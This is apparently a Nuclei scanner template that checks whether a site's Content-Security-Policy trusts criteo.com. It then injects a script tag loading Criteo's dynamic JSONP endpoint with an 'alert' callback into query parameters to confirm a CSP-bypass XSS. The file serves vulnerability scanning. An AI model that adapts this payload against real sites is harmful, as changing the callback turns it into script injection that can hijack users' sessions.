flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - criteo_dynamic_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: criteo_dynamic_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - criteo.com
  method: GET
  path:
  - '{{BaseURL}}'
id: criteo-dynamic-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - Criteo Dynamic
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,criteo-dynamic,vuln
